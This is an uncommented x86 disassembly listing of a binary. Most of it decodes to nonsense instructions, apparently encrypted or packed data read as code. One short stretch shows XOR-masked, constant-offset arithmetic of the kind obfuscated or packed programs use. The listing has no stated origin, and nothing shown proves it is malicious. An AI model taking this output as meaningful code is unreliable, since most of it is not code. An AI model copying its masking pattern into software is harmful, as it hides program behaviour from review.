  413340:	xchg   ebp,eax
  413341:	outs   dx,BYTE PTR ds:[esi]
  413342:	xchg   edi,eax
  413343:	mov    bl,0xc3
  413345:	mov    ebx,DWORD PTR [ecx-0xfe0114b]
  41334b:	or     esp,eax
  41334d:	imul   esi,DWORD PTR [eax],0xc78533c6
  413353:	dec    edx
  413354:	push   edx
  413355:	jno    0x413331
  413357:	sbb    al,ch
  413359:	or     DWORD PTR [ecx+eiz*4],0xffffffc5
  41335d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41335e:	test   BYTE PTR [ebp-0xb],0x3e
  413362:	outs   dx,DWORD PTR ds:[esi]
  413363:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413364:	push   0x50
  413366:	lock das 
  413368:	xchg   BYTE PTR [eax+0x6253e12c],dh
  41336e:	and    ecx,eax
  413370:	outs   dx,DWORD PTR ds:[esi]
  413371:	or     dl,BYTE PTR [esi]
  413373:	jp     0x4133a0
  413375:	dec    esp
  413376:	mov    ds:0xb61fcfa6,al
  41337b:	cmp    al,0xdd
  41337d:	in     eax,dx
  41337e:	icebp  
  41337f:	mov    ds:0xa94c901,al
  413384:	mov    esi,DWORD PTR [ecx+0x5c]
  413387:	inc    eax
  413388:	(bad)  
  413389:	mov    ebx,0x8080c4dd
  41338e:	sub    BYTE PTR [edi],0xb0
  413391:	sar    dh,1
  413393:	adc    ah,dl
  413395:	pop    es
  413396:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413397:	cs jno 0x4133af
  41339a:	repnz repnz aas 
  41339d:	push   es
  41339e:	repz push es
  4133a0:	and    bh,BYTE PTR [ebp-0x58c211d5]
  4133a6:	(bad)  
  4133a8:	retf   
  4133a9:	(bad)  
  4133aa:	popf   
  4133ab:	sbb    eax,0x337feb03
  4133b0:	(bad)  
  4133b1:	mov    DWORD PTR [ebx],ecx
  4133b3:	lds    edi,FWORD PTR [edx+edi*8-0x3334e51b]
  4133ba:	sbb    DWORD PTR [ecx-0x16],esi
  4133bd:	xor    dl,BYTE PTR [ebp-0x3b]
  4133c0:	fwait
  4133c1:	jl     0x413394
  4133c3:	not    BYTE PTR [esi]
  4133c5:	xchg   edi,eax
  4133c6:	pop    ebp
  4133c7:	cwde   
  4133c8:	shr    bh,0x6b
  4133cb:	and    al,0x7d
  4133cd:	pop    ss
  4133ce:	out    dx,eax
  4133cf:	fwait
  4133d0:	dec    edi
  4133d1:	test   al,0xe6
  4133d3:	mov    cl,0xdf
  4133d5:	retf   0xdbd7
  4133d8:	xchg   ebp,eax
  4133d9:	fcomp  QWORD PTR [edi+0x4e]
  4133dc:	aam    0x39
  4133de:	scas   eax,DWORD PTR es:[edi]
  4133df:	je     0x413454
  4133e1:	test   al,0x34
  4133e3:	fild   DWORD PTR [ebp+0x8]
  4133e6:	push   esi
  4133e7:	mov    BYTE PTR [esi-0x61dbfc9a],dh
  4133ed:	out    dx,eax
  4133ee:	push   ds
  4133ef:	in     eax,dx
  4133f0:	int    0xcb
  4133f2:	push   es
  4133f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133f4:	je     0x4133cc
  4133f6:	out    0xc0,eax
  4133f8:	xor    DWORD PTR [eax+ebp*8],ebx
  4133fb:	dec    ebx
  4133fc:	mov    eax,0xcd677989
  413401:	push   es
  413402:	scas   eax,DWORD PTR es:[edi]
  413403:	sub    DWORD PTR [edx],ebp
  413405:	stc    
  413406:	cdq    
  413407:	push   ecx
  413408:	mov    DWORD PTR [ecx],esi
  41340a:	and    eax,0x9d41cf92
  41340f:	std    
  413410:	sbb    al,0xfa
  413412:	jmp    0x413397
  413414:	loope  0x41340e
  413416:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413417:	das    
  413418:	ficomp WORD PTR [ebx]
  41341a:	stos   DWORD PTR es:[edi],eax
  41341b:	outs   dx,BYTE PTR ds:[esi]
  41341c:	and    BYTE PTR [ebp+0x43],ah
  41341f:	popf   
  413420:	shl    BYTE PTR [edx-0x5c],cl
  413423:	test   al,0x1f
  413425:	mov    bh,0xec
  413427:	push   edi
  413428:	not    BYTE PTR [ebx+0x2d9081cd]
  41342e:	mov    BYTE PTR [ebx-0x2e32ae4c],0x25
  413435:	xor    BYTE PTR [esi],ah
  413437:	add    BYTE PTR [ecx+esi*4-0x5e],ch
  41343b:	jne    0x413490
  41343d:	ror    BYTE PTR [ebx+0x2fd87cc6],1
  413443:	mov    DWORD PTR [ecx+ebx*1+0x24ac1687],esi
  41344a:	dec    edx
  41344b:	and    DWORD PTR [edi+ebx*8+0x51],edi
  41344f:	cli    
  413450:	jge    0x4133f1
  413452:	push   eax
  413453:	retf   0xe28
  413456:	mov    ecx,0xecf9fa30
  41345b:	(bad)  
  41345c:	jmp    0x4134cf
  41345e:	and    al,0x36
  413460:	mov    ebx,0x71af94c0
  413465:	aad    0x22
  413467:	daa    
  413468:	out    0x26,al
  41346a:	mov    esp,0x923ccb95
  41346f:	adc    DWORD PTR [ebx-0x6c058c90],ebx
  413475:	es pop ds
  413477:	ja     0x4134cc
  413479:	push   esi
  41347a:	jne    0x41344f
  41347c:	xlat   BYTE PTR ds:[ebx]
  41347d:	sahf   
  41347e:	ret    0x15f4
  413481:	sahf   
  413482:	and    eax,edx
  413484:	push   es
  413485:	jnp    0x413425
  413487:	ds cli 
  413489:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41348a:	ret    
  41348b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41348c:	and    esp,DWORD PTR [ebp-0x78]
  41348f:	mov    eax,DWORD PTR [eax+0x7d3ab21a]
  413495:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413496:	jnp    0x4134f9
  413498:	jmp    0x4134a9
  41349a:	xor    esp,DWORD PTR [ecx+0x72]
  41349d:	mov    al,0xb8
  41349f:	out    0x1b,eax
  4134a1:	xor    BYTE PTR [esi+0x54],al
  4134a4:	push   ebx
  4134a5:	test   DWORD PTR [eax+0x6e59afa],0x606aea90
  4134af:	ins    BYTE PTR es:[edi],dx
  4134b0:	bound  edx,QWORD PTR [edi-0x1b]
  4134b3:	jae    0x413449
  4134b5:	push   ss
  4134b6:	xor    BYTE PTR [ebx],dh
  4134b8:	and    DWORD PTR [ecx-0x28],ebp
  4134bb:	push   es
  4134bc:	mov    eax,0x8e0d4248
  4134c1:	or     al,0x6f
  4134c3:	jnp    0x413491
  4134c5:	xchg   BYTE PTR [ebp-0x551f34cc],dh
  4134cb:	jb     0x4134fa
  4134cd:	xchg   ebp,eax
  4134ce:	sahf   
  4134cf:	loope  0x413518
  4134d1:	aam    0xfc
  4134d3:	in     al,dx
  4134d4:	loope  0x41354d
  4134d6:	out    dx,eax
  4134d7:	call   0xb7bb4db
  4134dc:	repz adc DWORD PTR [ebp-0x4b9b0204],edi
  4134e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134e4:	cld    
  4134e5:	xchg   ebp,eax
  4134e6:	test   al,0x60
  4134e8:	dec    ecx
  4134e9:	push   eax
  4134ea:	pop    ebp
  4134eb:	sbb    eax,0x1ad01bc6
  4134f0:	mov    al,0x6
  4134f2:	mov    dh,0x49
  4134f4:	pusha  
  4134f5:	pushf  
  4134f6:	cmp    DWORD PTR [bx+di+0x6436],esi
  4134fb:	(bad)  
  4134fc:	pop    esp
  4134fd:	jbe    0x413487
  4134ff:	(bad)  
  413500:	jg     0x413573
  413502:	ins    BYTE PTR es:[edi],dx
  413503:	sub    cl,dl
  413505:	sbb    DWORD PTR [ecx],ebx
  413507:	sar    DWORD PTR [ebp+0x2024c1bd],0xcd
  41350e:	jns    0x4134fb
  413510:	out    dx,al
  413511:	adc    ch,bl
  413513:	fist   DWORD PTR [ecx+0xa]
  413516:	push   ds
  413517:	push   edx
  413518:	retf   0xc104
  41351b:	pop    ss
  41351c:	pop    ebp
  41351d:	addr16 je 0x4134a1
  413520:	mov    WORD PTR [ebx+esi*8-0x7429f61],cs
  413527:	rol    BYTE PTR [edi+0x661f2de2],cl
  41352d:	popf   
  41352e:	xchg   esi,eax
  41352f:	sbb    ah,dh
  413531:	(bad)  
  413532:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413533:	mov    ds:0xf69bdab2,al
  413538:	in     al,0x14
  41353a:	nop
  41353b:	and    BYTE PTR [ebp-0x2f046aae],0x7c
  413542:	mov    eax,ds:0x183786d2
  413547:	lahf   
  413548:	cs popf 
  41354a:	pop    esi
  41354b:	nop
  41354c:	leave  
  41354d:	repnz sahf 
  41354f:	fisubr DWORD PTR [edx-0x7013873]
  413555:	sbb    eax,0x2ba43412
  41355a:	push   esi
  41355b:	jle    0x413581
  41355d:	outs   dx,BYTE PTR ds:[esi]
  41355e:	and    eax,0x8eee473d
  413563:	cmp    al,0x5d
  413565:	push   ds
  413566:	int    0xf9
  413568:	mov    ds:0x41a7e5e2,al
  41356d:	dec    esp
  41356e:	pop    edi
  41356f:	pop    edi
  413570:	enter  0xb5d2,0xaa
  413574:	adc    al,0x4
  413576:	pop    esp
  413577:	pop    edx
  413578:	mov    ch,0x24
  41357a:	js     0x4135ac
  41357c:	call   FWORD PTR [eax+edi*8-0x4d]
  413580:	push   ecx
  413581:	jae    0x41358e
  413583:	or     bl,BYTE PTR [edx]
  413585:	or     DWORD PTR [edx+0x50],eax
  413588:	in     eax,dx
  413589:	enter  0x29c6,0x5b
  41358d:	xor    BYTE PTR [eax],0xe5
  413590:	add    cl,BYTE PTR [edi-0x7]
  413593:	pop    sp
  413595:	ret    
  413596:	push   esp
  413597:	jb     0x41351b
  413599:	jne    0x413535
  41359b:	mov    fs,WORD PTR [ebx+0x58]
  41359e:	pusha  
  41359f:	cwde   
  4135a0:	and    DWORD PTR [esi-0x61e27dc7],ebp
  4135a6:	dec    ebx
  4135a7:	popf   
  4135a8:	mov    DWORD PTR [esi+0x16f83e52],0xf0ced2b9
  4135b2:	xor    al,0xdc
  4135b4:	mov    esi,0x256f6050
  4135b9:	sub    al,0x6e
  4135bb:	push   cs
  4135bc:	jecxz  0x41362c
  4135be:	dec    ebx
  4135bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135c0:	outs   dx,DWORD PTR ds:[esi]
  4135c1:	xchg   edx,eax
  4135c2:	mov    al,0xd1
  4135c4:	rcl    ecx,cl
  4135c6:	jge    0x41361d
  4135c8:	jae    0x4135bb
  4135ca:	jle    0x4135df
  4135cc:	test   DWORD PTR [esi-0x1018ad60],ecx
  4135d2:	test   DWORD PTR [edi],esp
  4135d4:	inc    ecx
  4135d5:	(bad)  
  4135d6:	xor    bh,BYTE PTR [eax+0x11ad8ca8]
  4135dc:	repnz into 
  4135de:	ins    DWORD PTR es:[edi],dx
  4135df:	add    ebx,edi
  4135e1:	or     al,0xa7
  4135e3:	scas   al,BYTE PTR es:[edi]
  4135e4:	aam    0x11
  4135e6:	push   cs
  4135e7:	imul   edx,DWORD PTR [edi+0x6c],0xadcdb425
  4135ee:	xchg   edx,edx
  4135f0:	push   eax
  4135f1:	mov    esp,0x26b19356
  4135f6:	nop
  4135f7:	sub    BYTE PTR [ecx],al
  4135f9:	pop    ss
  4135fa:	push   esp
  4135fb:	inc    ebp
  4135fc:	int    0xb1
  4135fe:	pop    edx
  4135ff:	mov    BYTE PTR [ecx-0x2],cl
  413602:	and    eax,0x5dbfd867
  413607:	pop    ebp
  413608:	push   ds
  413609:	aaa    
  41360a:	rcr    edi,cl
  41360c:	sbb    BYTE PTR [edi-0x5d],bh
  41360f:	adc    DWORD PTR [edx],edi
  413611:	in     al,dx
  413612:	in     al,dx
  413613:	and    eax,0x5cb73fb8
  413618:	mov    BYTE PTR [ecx+0x21],dh
  41361b:	pop    ss
  41361c:	pop    ds
  41361d:	ror    al,0x8a
  413620:	add    BYTE PTR [eax-0x6a7c9a82],cl
  413626:	push   edx
  413627:	jb     0x413623
  413629:	mov    dl,0xb7
  41362b:	shl    BYTE PTR [ebx+ebp*4-0x265e2740],1
  413632:	mov    BYTE PTR [ebx+eiz*2+0x759439e9],dh
  413639:	mov    edx,0xe140ac90
  41363e:	inc    ebp
  41363f:	or     DWORD PTR [edi-0x325bbe09],ecx
  413645:	pop    ds
  413646:	imul   ebp,DWORD PTR [ebx-0x64b6124b],0xf
  41364d:	popf   
  41364e:	or     eax,0xf24f656
  413653:	adc    ah,BYTE PTR [edx+0x79]
  413656:	retf   0xa684
  413659:	frstor [esi+eiz*8+0x7473ace0]
  413660:	adc    eax,0x64d48095
  413665:	aas    
  413666:	push   0x2a796836
  41366b:	adc    al,0x89
  41366d:	fwait
  41366e:	(bad)  
  41366f:	ror    BYTE PTR [eax+0x63],cl
  413672:	out    0xe0,al
  413674:	stc    
  413675:	xchg   ebp,eax
  413676:	mov    dl,ah
  413678:	and    BYTE PTR [esp+ecx*4+0x40],dl
  41367c:	rcr    DWORD PTR [ecx-0x2fcfb51b],0x92
  413683:	add    BYTE PTR [ebp-0x220267fa],ah
  413689:	cmp    eax,0x7b087f31
  41368e:	dec    esi
  41368f:	mov    cl,ch
  413691:	mov    esi,0x6bc9cc36
  413696:	into   
  413697:	fdivr  DWORD PTR [esi+0x479e8a46]
  41369d:	push   ebx
  41369e:	adc    DWORD PTR [ecx+0x4d],ebp
  4136a1:	xlat   BYTE PTR ds:[ebx]
  4136a2:	ror    DWORD PTR [edi],1
  4136a4:	(bad)  
  4136a5:	cmp    eax,0xe39068bf
  4136aa:	jmp    0x4136d7
  4136ac:	dec    ebp
  4136ad:	mov    ch,0x68
  4136af:	and    eax,0x4e7d0ff7
  4136b4:	xchg   edi,eax
  4136b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136b6:	loope  0x413723
  4136b8:	cmp    DWORD PTR [edx+0xaea793],eax
  4136be:	xchg   esp,eax
  4136bf:	scas   al,BYTE PTR es:[edi]
  4136c0:	mov    ebx,DWORD PTR [ebp-0xc]
  4136c3:	xor    edx,esi
  4136c5:	add    edx,edi
  4136c7:	imul   edx,ebx
  4136ca:	mov    ebx,DWORD PTR [ebp-0x8]
  4136cd:	mov    BYTE PTR [edx+ebx*1],al
  4136d0:	mov    eax,DWORD PTR [ebp-0x30]
  4136d3:	mov    edx,DWORD PTR [ebp-0x3c]
  4136d6:	xor    eax,esi
  4136d8:	xor    edx,esi
  4136da:	add    eax,edi
  4136dc:	add    edx,edi
  4136de:	imul   eax,edx
  4136e1:	add    eax,DWORD PTR [ebp-0xc]
  4136e4:	mov    DWORD PTR [ebp-0xc],eax
  4136e7:	mov    eax,DWORD PTR [ebp-0xc]
  4136ea:	mov    edx,DWORD PTR [ebp-0x24]
  4136ed:	cmp    edx,eax
  4136ef:	jb     0x411257
  4136f5:	mov    eax,DWORD PTR [ebp-0x3c]
  4136f8:	mov    edx,DWORD PTR [ebp-0x24]
  4136fb:	xor    eax,esi
  4136fd:	add    eax,edi
  4136ff:	imul   eax,edx
  413702:	mov    edx,DWORD PTR [ebp-0x20]
  413705:	xor    edx,esi
  413707:	add    edx,edi
  413709:	or     eax,edx
  41370b:	mov    edx,DWORD PTR [ebp-0x18]
  41370e:	xor    edx,esi
  413710:	add    eax,edx
  413712:	mov    edx,DWORD PTR [ebp-0x18]
  413715:	xor    edx,esi
  413717:	add    eax,edx
  413719:	mov    edx,DWORD PTR [ebp-0x10]
  41371c:	lea    eax,[eax+edx*1+0x64e5b6]
  413723:	jmp    0x413737
  413728:	mov    eax,DWORD PTR [ebp-0x18]
  41372b:	mov    edx,DWORD PTR [ebp-0x10]
  41372e:	xor    eax,esi
  413730:	lea    eax,[eax+edx*1+0x3272db]
  413737:	mov    DWORD PTR [ebp-0x10],eax
  41373a:	jmp    0x4111a4
  41373f:	mov    eax,DWORD PTR [ebp-0x38]
  413742:	mov    edx,DWORD PTR [ebp+0xc]
  413745:	xor    edx,esi
  413747:	lea    ecx,[ecx+edx*1+0x3272db]
  41374e:	lea    edx,[ecx-0x3272db]
  413754:	xor    edx,esi
  413756:	cmp    edx,0xf89c95b6
  41375c:	jne    0x410fde
  413762:	mov    ecx,DWORD PTR [ebp+0x8]
  413765:	mov    edx,DWORD PTR [ebp+0xc]
  413768:	mov    ebx,DWORD PTR [ebp+0x8]
  41376b:	xor    edx,esi
  41376d:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  413774:	xor    ecx,esi
  413776:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  41377d:	xor    ebx,esi
  41377f:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  413786:	jmp    0x415b38
  41378b:	xlat   BYTE PTR ds:[ebx]
  41378c:	repz mov bh,0xb2
  41378f:	xchg   ebx,eax
  413790:	mov    fs,WORD PTR [edi+0xef9e63]
  413796:	mov    bl,0x11
  413798:	add    ebp,DWORD PTR [eax]
  41379a:	lock mov ds:0xcd62626b,al
  4137a0:	pop    edi
  4137a1:	bound  esp,QWORD PTR [edx+0x71]
  4137a4:	pop    ebp
  4137a5:	lds    esi,FWORD PTR [edx]
  4137a7:	or     DWORD PTR [ecx],ebp
  4137a9:	rcl    bl,1
  4137ab:	inc    eax
  4137ac:	xchg   ebp,eax
  4137ad:	sbb    al,BYTE PTR [edi]
  4137af:	scas   al,BYTE PTR es:[edi]
  4137b0:	ins    DWORD PTR es:[edi],dx
  4137b1:	inc    edi
  4137b2:	add    BYTE PTR gs:[eax+0x38],bl
  4137b6:	cli    
  4137b7:	pop    ds
  4137b8:	lahf   
  4137b9:	fwait
  4137ba:	adc    edi,DWORD PTR [ebx+eiz*4+0xc773d2e]
  4137c1:	(bad)  
  4137c2:	and    eax,0x8210160
  4137c7:	call   0x9a8f:0xc62d6af1
  4137ce:	rol    bl,1
  4137d0:	jb     0x4137da
  4137d2:	mov    eax,ds:0xdea6b5d5
  4137d7:	dec    ebx
  4137d8:	in     eax,dx
  4137d9:	ror    ecx,cl
  4137db:	jnp    0x4137e5
  4137dd:	push   es
  4137de:	aas    
  4137df:	jb     0x413854
  4137e1:	stos   BYTE PTR es:[edi],al
  4137e2:	mov    edx,0x1f5e0d80
  4137e7:	daa    
  4137e8:	jge    0x41384b
  4137ea:	cdq    
  4137eb:	jp     0x41380d
  4137ed:	jne    0x413849
  4137ef:	lahf   
  4137f0:	pop    ebp
  4137f1:	jle    0x4137ef
  4137f3:	adc    al,0xa5
  4137f5:	fidiv  WORD PTR [edi-0x1dfe527b]
  4137fb:	imul   esi,DWORD PTR [eax-0x53],0xffffffd4
  4137ff:	scas   al,BYTE PTR es:[edi]
  413800:	push   0xfffffffe
  413802:	ficomp DWORD PTR [ecx-0x464653c0]
  413808:	hlt    
  413809:	cld    
  41380a:	pop    edi
  41380b:	xor    DWORD PTR [ecx],0xd14cecc2
  413811:	mov    WORD PTR ss:[ebp+0x63cba601],gs
  413818:	cmp    bh,cl
  41381a:	push   ebp
  41381b:	test   eax,0x50c5cd25
  413820:	iret   
  413821:	call   0xddcf768d
  413826:	mov    dl,0xd0
  413828:	(bad)  
  413829:	ja     0x41383d
  41382b:	sbb    edx,DWORD PTR [edx+eiz*2-0x3a]
  41382f:	jns    0x4137c2
  413831:	sub    BYTE PTR [edi+0x69],ah
  413834:	ret    0xe093
  413837:	push   es
  413838:	(bad)  
  413839:	push   ebx
  41383a:	fldenv [ebp-0x285b71bc]
  413841:	jmp    0x1d7ba8eb
  413846:	pop    ecx
  413847:	sub    BYTE PTR [edi+ebx*2+0x781bf808],ch
  41384e:	cmp    al,0x9d
  413850:	sahf   
  413851:	cmp    DWORD PTR ds:0x2b78137a,esi
  413857:	lods   al,BYTE PTR ds:[esi]
  413858:	mov    bh,dl
  41385a:	jns    0x4138c2
  41385c:	retf   0x4ffc
  41385f:	(bad)  
  413860:	in     eax,dx
  413861:	dec    esi
  413862:	(bad)  
  413863:	or     eax,0xf82b21b2
  413868:	pop    ds
  413869:	inc    edx
  41386a:	cld    
  41386b:	jns    0x413834
  41386d:	es and ebx,ecx
  413870:	cmc    
  413871:	cmp    BYTE PTR [eax],ch
  413873:	dec    ecx
  413874:	addr16 dec esi
  413876:	icebp  
  413877:	add    al,0x8d
  413879:	sub    bl,BYTE PTR [edx]
  41387b:	sub    DWORD PTR [ebp+0x63],ebp
  41387e:	add    al,0xcf
  413880:	mov    BYTE PTR [edi],bl
  413882:	and    eax,0xd0d67336
  413887:	xor    eax,0x3cf9f6a6
  41388c:	aam    0xa6
  41388e:	ret    0x1752
  413891:	sub    al,0xfc
  413893:	xchg   edi,eax
  413894:	push   ds
  413895:	call   0xdf0890b6
  41389a:	push   cs
  41389b:	mov    esp,0x18f2d904
  4138a0:	je     0x413838
  4138a2:	jmp    0x4138c0
  4138a4:	xchg   DWORD PTR [edx-0x69],ebx
  4138a7:	jno    0x41390e
  4138a9:	adc    BYTE PTR [edx+0x3700878a],bl
  4138af:	or     BYTE PTR [ebx],0x3c
  4138b2:	or     DWORD PTR [edx+0x44ab11ac],eax
  4138b8:	je     0x4138eb
  4138ba:	sbb    ah,0xfc
  4138bd:	imul   esp,DWORD PTR [edi+0x3125359b],0xcd2c38b6
  4138c7:	mov    ebx,0x6da1e277
  4138cc:	stos   BYTE PTR es:[edi],al
  4138cd:	cdq    
  4138ce:	lods   al,BYTE PTR ds:[esi]
  4138cf:	stos   DWORD PTR es:[edi],eax
  4138d0:	mov    edx,0x3b7ab6e6
  4138d5:	js     0x413899
  4138d7:	sti    
  4138d8:	push   edx
  4138d9:	cs in  eax,0xe0
  4138dc:	ja     0x413887
  4138de:	popa   
  4138df:	cmp    edx,DWORD PTR ds:0x1e858877
  4138e5:	push   edi
  4138e6:	sbb    eax,0xc3283968
  4138eb:	push   es
  4138ec:	jmp    0x41388a
  4138ee:	mov    BYTE PTR [ebp+0x78],bh
  4138f1:	ins    DWORD PTR es:[edi],dx
  4138f2:	lods   eax,DWORD PTR ds:[esi]
  4138f3:	adc    dh,dh
  4138f5:	ss leave 
  4138f7:	mov    ds:0x6c0bd361,eax
  4138fc:	push   ebx
  4138fd:	loope  0x413932
  4138ff:	sbb    ecx,DWORD PTR [esp+esi*8+0x44]
  413903:	pusha  
  413904:	mov    ebx,0xaa2ccd6b
  413909:	arpl   WORD PTR [esi+0x3df1142e],bp
  41390f:	lock loopne 0x4138bd
  413912:	dec    edi
  413913:	fwait
  413914:	jbe    0x8fe8359b
  41391a:	mov    ch,BYTE PTR [esi+0x12]
  41391d:	add    al,0xe3
  41391f:	xchg   ebp,eax
  413920:	xchg   ecx,eax
  413921:	out    0x58,eax
  413923:	sub    edi,0xffffffe2
  413926:	add    DWORD PTR [ebp-0x6d050948],edi
  41392c:	pop    ecx
  41392d:	pop    ecx
  41392e:	dec    ecx
  41392f:	and    ebx,DWORD PTR [edi]
  413931:	ins    BYTE PTR es:[edi],dx
  413932:	mov    bh,0xdd
  413934:	aad    0x64
  413936:	std    
  413937:	add    BYTE PTR [edi-0xc47589d],cl
  41393d:	arpl   WORD PTR ds:0x27e15a4e,bx
  413943:	push   ss
  413944:	xor    al,0x6f
  413946:	mov    dl,0x81
  413948:	imul   ecx,DWORD PTR [ecx+ebx*2+0x30],0x5021707d
  413950:	(bad)  
  413951:	mov    DWORD PTR [esi+0x76],esp
  413954:	nop
  413955:	mov    dh,0x3b
  413957:	shl    BYTE PTR [ecx],cl
  413959:	shr    BYTE PTR [esi],0xe
  41395c:	pop    esp
  41395d:	sbb    edx,DWORD PTR [ecx]
  41395f:	(bad)  
  413960:	es ins DWORD PTR es:[edi],dx
  413962:	jecxz  0x41396d
  413964:	dec    ebp
  413965:	add    edi,ecx
  413967:	out    dx,eax
  413968:	pop    es
  413969:	xchg   ebx,eax
  41396a:	(bad)  [ecx]
  41396c:	push   ds
  41396d:	mov    al,0x4b
  41396f:	dec    edi
  413970:	mov    dh,0xb1
  413972:	xchg   ebp,eax
  413973:	sub    BYTE PTR [eax],0x42
  413976:	dec    ecx
  413977:	shr    BYTE PTR [esi-0x71],cl
  41397a:	int3   
  41397b:	int3   
  41397c:	mov    ch,0x47
  41397e:	lea    ebp,ss:[ebx-0x4c71a4ad]
  413985:	jmp    0x413a00
  413987:	cs dec esp
  413989:	lea    ebp,[esi]
  41398b:	dec    ebx
  41398c:	es into 
  41398e:	xchg   esi,eax
  41398f:	test   BYTE PTR [ebx+ebx*2-0x23],ch
  413993:	shl    al,0xd0
  413996:	adc    eax,0xddc0c9d0
  41399b:	fist   WORD PTR [edi]
  41399d:	fdiv   st,st(6)
  41399f:	pop    edx
  4139a0:	gs dec ebx
  4139a2:	cmp    dh,BYTE PTR [eax+0x10]
  4139a5:	dec    esi
  4139a6:	xchg   ebp,eax
  4139a7:	xor    DWORD PTR [edx+0x148e5841],edx
  4139ad:	stos   BYTE PTR es:[edi],al
  4139ae:	out    0x80,eax
  4139b0:	lock mov ecx,DWORD PTR [ebx-0x45d80a22]
  4139b7:	mov    ds:0xc8d1ed8e,al
  4139bc:	sti    
  4139bd:	dec    edx
  4139be:	or     BYTE PTR [edx-0xb9f1b6e],ch
  4139c4:	push   cs
  4139c5:	jecxz  0x413a07
  4139c7:	mov    eax,ds:0xad4a1427
  4139cc:	loop   0x4139d4
  4139ce:	xchg   edx,eax
  4139cf:	add    bl,dl
  4139d1:	pusha  
  4139d2:	int3   
  4139d3:	popf   
  4139d4:	xchg   BYTE PTR [edi-0x5e],cl
  4139d7:	lahf   
  4139d8:	pop    esp
  4139d9:	imul   BYTE PTR [esi]
  4139db:	sbb    al,BYTE PTR [ebp+ebx*4-0x37]
  4139df:	out    dx,al
  4139e0:	shr    BYTE PTR [ebp-0x57],1
  4139e3:	sahf   
  4139e4:	(bad)
  4139e7:	jecxz  0x4139fe
  4139e9:	mov    bl,0x92
  4139eb:	scas   al,BYTE PTR es:[edi]
  4139ec:	psadbw mm2,QWORD PTR fs:[ebx-0x3708af2b]
  4139f4:	imul   edx,DWORD PTR [ecx-0x23],0xcc951b9c
  4139fb:	inc    ecx
  4139fc:	std    
  4139fd:	mov    BYTE PTR [ebp-0x55],al
  413a00:	cmp    esp,DWORD PTR [eax+ecx*4-0x3542f560]
  413a07:	scas   eax,DWORD PTR es:[edi]
  413a08:	or     eax,0xf250fe57
  413a0d:	dec    edx
  413a0e:	cmc    
  413a0f:	daa    
  413a10:	pop    ecx
  413a11:	les    ebp,FWORD PTR [ecx+0x44]
  413a14:	xor    edx,DWORD PTR [esi+ecx*8]
  413a17:	cmp    ebp,ebp
  413a19:	mov    al,ds:0x2bb4d0fa
  413a1e:	lock jns 0x413a3d
  413a21:	dec    esi
  413a22:	sub    DWORD PTR [ebx],ebx
  413a24:	push   ecx
  413a25:	push   es
  413a26:	mov    esp,0xe11f11f3
  413a2b:	xchg   ebp,eax
  413a2c:	inc    ecx
  413a2d:	mov    bh,0xbf
  413a2f:	sbb    eax,0x8c39b5df
  413a34:	push   esi
  413a35:	call   0x273f8c5
  413a3a:	aam    0x2f
  413a3c:	sbb    ebx,DWORD PTR [ebp-0x3c57f28]
  413a42:	xchg   edi,eax
  413a43:	sar    DWORD PTR [edi],cl
  413a45:	and    BYTE PTR [ebx],dh
  413a47:	retf   
  413a48:	addr16 nop
  413a4a:	inc    esp
  413a4b:	lahf   
  413a4c:	loope  0x4139f9
  413a4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a4f:	fistp  WORD PTR [edi+0x11]
  413a52:	pop    edi
  413a53:	or     DWORD PTR [esi-0x77],eax
  413a56:	push   0x35
  413a58:	in     eax,0x38
  413a5a:	pop    ebx
  413a5b:	jae    0x413acd
  413a5d:	jmp    0x5515:0x6ea4c25b
  413a64:	(bad)  
  413a66:	(bad)  
  413a68:	scas   al,BYTE PTR es:[edi]
  413a69:	jge    0x413a3d
  413a6b:	retf   
  413a6c:	pop    ebp
  413a6d:	xor    dh,BYTE PTR [ecx+0x908882a]
  413a73:	stos   BYTE PTR es:[edi],al
  413a74:	or     esp,DWORD PTR [esi-0x25bffe69]
  413a7a:	push   ecx
  413a7b:	push   0xffffffc9
  413a7d:	push   eax
  413a7e:	jns    0x413ac6
  413a80:	or     edx,0xffffffc6
  413a83:	in     eax,dx
  413a84:	call   0x8c9f:0x8585a02c
  413a8b:	hlt    
  413a8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a8d:	sbb    DWORD PTR [ebp+0x541b155f],eax
  413a93:	mov    BYTE PTR [ebx+eiz*8+0x43],dl
  413a97:	leave  
  413a98:	je     0x413a9a
  413a9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a9b:	cwde   
  413a9c:	neg    DWORD PTR [esp+ecx*2]
  413a9f:	cmc    
  413aa0:	stc    
  413aa1:	and    dh,BYTE PTR [ebp-0x37]
  413aa4:	stos   DWORD PTR es:[edi],eax
  413aa5:	aad    0x83
  413aa7:	push   ecx
  413aa8:	adc    BYTE PTR [ebx+0x72976181],dh
  413aae:	repz xor BYTE PTR [ecx+0x7a],bl
  413ab2:	inc    ecx
  413ab3:	addr16 fwait
  413ab5:	jb     0x413acc
  413ab7:	and    al,0x71
  413ab9:	fild   DWORD PTR [esi-0x66]
  413abc:	sub    eax,0x9f977aa1
  413ac1:	mul    BYTE PTR [edx+0x5e]
  413ac4:	mov    dh,0xa8
  413ac6:	fbld   TBYTE PTR [ebp+eiz*1+0x6ad1a187]
  413acd:	or     edi,DWORD PTR [ebp+eax*2-0x3cad4bd2]
  413ad4:	adc    DWORD PTR [eax-0x4200eb2a],edi
  413ada:	(bad)  
  413adb:	outs   dx,BYTE PTR ds:[esi]
  413adc:	sub    bl,BYTE PTR ds:[ecx+edi*4-0x7db26a63]
  413ae4:	(bad)  
  413ae5:	cmp    al,0x18
  413ae7:	and    eax,edi
